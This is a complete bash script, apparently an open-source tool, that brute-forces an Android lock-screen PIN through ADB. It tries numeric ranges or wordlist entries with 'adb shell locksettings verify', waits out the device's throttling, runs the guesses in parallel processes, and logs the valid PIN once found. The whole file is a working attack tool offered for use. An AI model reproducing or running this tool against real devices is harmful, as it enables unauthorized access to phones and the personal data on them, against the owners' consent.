#!/usr/bin/env bash

# - iNFO --------------------------------------
#
#   Author: wuseman <wuseman@nr1.nu>
# FileName: androidBruter.sh
#  Created: 2023-06-17 (22:01:58)
# Modified: 2023-06-17 (22:02:05)
#  Version: 1.0
#  License: MIT
#
#      iRC: wuseman (Libera/EFnet/LinkNet)
#   GitHub: https://github.com/wuseman/
#
# ----------------------------------------------

LOG_FILE="brute_force.log"

# Log function
log() {
    local message=$1
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $message" | tee -a "$LOG_FILE"
}

# Verify if a PIN code is valid
verify_pin() {
    local pin=$1
    local result=$(adb shell locksettings verify --old "$pin" 2>&1)

    if [[ $result == *"Lock credential verified successfully"* ]]; then
        log "PIN code $pin is valid"
        touch .wbruter-status
        exit 0
    elif [[ $result == *"Request throttled"* ]]; then
        log "Request throttled. Waiting for device to leave throttling mode..."
        sleep 5
        verify_pin "$pin"
    else
        log "PIN code $pin is not valid"
    fi
}

# Brute force attack on PIN codes
brute_force() {
    local start=$1
    local end=$2
    local pin_length=$3
    local password_file=$4

    if [[ -z $password_file ]]; then
        for ((pin = start; pin <= end; pin++)); do
            pin=$(printf "%0${pin_length}d" $pin)
            verify_pin "$pin"
        done
    else
        while read -r pin; do
            verify_pin "$pin"
        done <"$password_file"
    fi
}

# Parallelize the brute force attack
parallel_brute_force() {
    local pin_length=$1
    local num_processes=$2
    local start_pin=$3
    local end_pin=$4
    local password_file=$5

    local range=$((end_pin - start_pin + 1))
    local chunk_size=$((range / num_processes))
    if ((chunk_size == 0)); then
        chunk_size=1
        num_processes=$range
    fi

    local start=$start_pin
    local end=$end_pin

    for ((i = 0; i < num_processes; i++)); do
        local process_start=$((start + i * chunk_size))
        local process_end=$((process_start + chunk_size - 1))
        if ((process_end > end)); then
            process_end=$end
        fi
        brute_force "$process_start" "$process_end" "$pin_length" "$password_file" &
    done

    wait
}

# Main function
main() {
    local pin_length=0
    local num_processes=1
    local start_pin=0
    local end_pin=9999
    local password_file=""

    # Check if getopt is available
    local getopt_cmd=$(command -v getopt)
    if [[ -z "$getopt_cmd" ]]; then
        echo "Error: getopt command not found. Please install the 'util-linux' package or an equivalent to use this script."
        exit 1
    fi

    # Process command-line options
    local OPTIONS
    OPTIONS=$("$getopt_cmd" -o l:n:s:e:f:h --long pin-length:,num-processes:,start-pin:,end-pin:,file:,help -- "$@")

    if [[ $? -ne 0 ]]; then
        echo "Error: Invalid option"
        print_usage
        exit 1
    fi

    eval set -- "$OPTIONS"

    while true; do
        case "$1" in
        -l | --pin-length)
            if ! [[ "$2" =~ ^[1-9][0-9]*$ ]]; then
                echo "Error: Invalid PIN length specified."
                print_usage
                exit 1
            fi
            pin_length=$2
            shift 2
            ;;
        -n | --num-processes)
            if ! [[ "$2" =~ ^[1-9][0-9]*$ ]]; then
                echo "Error: Invalid number of parallel processes specified."
                print_usage
                exit 1
            fi
            num_processes=$2
            shift 2
            ;;
        -s | --start-pin)
            if ! [[ "$2" =~ ^[1-9][0-9]*$ ]]; then
                echo "Error: Invalid start PIN specified."
                print_usage
                exit 1
            fi
            start_pin=$2
            shift 2
            ;;
        -e | --end-pin)
            if ! [[ "$2" =~ ^[1-9][0-9]*$ ]]; then
                echo "Error: Invalid end PIN specified."
                print_usage
                exit 1
            fi
            end_pin=$2
            shift 2
            ;;
        -f | --file)
            password_file=$2
            shift 2
            ;;
        -h | --help)
            print_usage
            exit 0
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "Invalid option: $1"
            print_usage
            exit 1
            ;;
        esac
    done

    if [[ $pin_length -eq 0 ]]; then
        echo "Error: PIN length not specified."
        print_usage
        exit 1
    fi

    if ((pin_length < 4 || pin_length > 12)); then
        echo "Error: Invalid PIN length. Length must be between 4 and 12."
        print_usage
        exit 1
    fi

    if ((num_processes < 1 || num_processes > 9)); then
        echo "Error: Invalid number of parallel processes. Must be between 1 and 9."
        print_usage
        exit 1
    fi

    local adb=$(command -v adb)
    if [[ -z "$adb" ]]; then
        echo "Error: ADB is not installed. Please install the 'adb' package before running this script."
        exit 1
    fi

    if [[ -n $password_file ]]; then
        if [[ ! -f $password_file ]]; then
            echo "Error: Password file '$password_file' not found."
            exit 1
        fi
    fi

    parallel_brute_force "$pin_length" "$num_processes" "$start_pin" "$end_pin" "$password_file"
}

# Print usage information
print_usage() {
    echo "Usage: $(basename "$0") -l <pin_length> -n <num_processes> -s <start_pin> -e <end_pin> [-f <password_file>]"
    echo "Options:"
    echo "  -l, --pin-length LENGTH     Length of the PIN code (between 4 and 12)"
    echo "  -n, --num-processes PROCESSES"
    echo "                             Number of parallel processes to use (default: 1, max: 9)"
    echo "  -s, --start-pin PIN         Starting PIN code (default: 0)"
    echo "  -e, --end-pin PIN           Ending PIN code (default: 9999)"
    echo "  -f, --file PASSWORD_FILE    File containing passwords to verify"
    echo "  -h, --help                  Display this help message"
}

main "$@"
